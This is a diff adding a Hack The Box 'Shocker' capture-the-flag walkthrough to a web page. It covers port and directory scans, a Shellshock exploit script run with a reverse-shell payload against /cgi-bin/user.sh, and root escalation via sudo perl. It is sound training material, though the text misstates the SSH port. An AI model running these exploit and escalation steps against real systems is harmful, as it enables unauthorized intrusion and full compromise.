@@ -29,7 +29,7 @@
       <div id="___gatsby">
       <div style="outline:none" tabindex="-1" role="group" id="gatsby-focus-wrapper">
       <div class="headroom-wrapper">
-         <div style="position:relative;top:0;left:0;right:0;z-index:100;-webkit-transform:translate3D(0, 0, 0);-ms-transform:translate3D(0, 0, 0);transform:translate3D(0, 0, 0);background:#000000;padding-top:7.5px;margin-bottom:1.rem;height:100px;" class="headroom headroom--unfixed">
+         <div style="position:relative;top:0;left:0;right:0;z-index:100;-webkit-transform:translate3D(0, 0, 0);-ms-transform:translate3D(0, 0, 0);transform:translate3D(0, 0, 0);background:#000000;padding-top:7.5px;margin-bottom:1.rem;height:80px;" class="headroom headroom--unfixed">
             <div size="500" class="sc-htpNat fphlTp">
                <div style="margin:0 auto;max-width:960px" class="css-zkfaav">
 				  <a href="/"><img height="84" alt="wicked" src="/assets/images/WICKED.png" style="display:inline"/></a>
@@ -38,3 +38,57 @@
          </div>
       </div>
       <div style="margin:0 auto;max-width:960px;padding-top:24px">
+<h1>Hack The Box: Shocker walkthrough</h1>
+<h3>IP Address: 10.10.10.56</h3>
+
+<p>NMAP scanning:</p>
+<pre><code>
+nmap -p- --min-rate=1000 10.10.10.56 -T4<br>
+PORT     STATE SERVICE
+80/tcp   open  http
+2222/tcp open  EtherNetIP-1<br>
+</pre><code>
+
+<pre><code>
+nmap -p80,2222 -sC -A -Pn- 10.10.10.56<br>
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</pre><code>
+<p>HTTP is open and SSH is running on port 22. I will enumerate HTTP, by visiting the website first.</p>
+<img src="/assets/images/htb/shocker/shocker_1.jpg"><br>
+<p>It is an empty webpage with an image it seems. I will run a directory scanner against the website and we will notice a cgi-bin/ directory, which opens up possibility of shellshock vulnerability.</p>
+<pre><code>
+gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.10.56/ -x php,html,txt<br>
+<b>/cgi-bin/ (Status: 403)</b>
+/cgi-bin/.html (Status: 403)
+/index.html (Status: 200)
+/index.html (Status: 200)
+/server-status (Status: 403)
+</code></pre>
+<p> Run a second directory scanner against the cgi-bin/ directory, but with additional extension - .sh</p>
+<pre><code>
+gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.10.56/cgi-bin/ -x php,html,txt,sh<br>
+<b>/user.sh (Status: 200)</b>
+</code></pre>
+<p>Use searchsploit to find an exploit script that we can use to shellshock.</p>
+<img src="/assets/images/htb/shocker/shocker_2.jpg"><br>
+<p>Note to reader: there will be an error when running the script. Windows and Linux have different break line interpretations - to fix, simply change the format from DOS to Unix with '<b>dos2unix 34900.py</b>' and run the script.</p>
+<pre><code>
+./34900.py payload=reverse rhost=<RHOST IP> lhost=<LHOST IP> lport=<LPORT> pages=/cgi-bin/user.sh
+</code></pre>
+<img src="/assets/images/htb/shocker/shocker_3.jpg"><br>
+<p>As the user shelly, it looks like perl is allowed to use with sudo. Additionally, it seems like Perl can be used to privilege escalate, <a href="https://gtfobins.github.io/gtfobins/perl/">GTFOBins</a> verifies this.</p>
+<img src="/assets/images/htb/shocker/shocker_5.jpg"><br>
+<p>And we are root!</p>
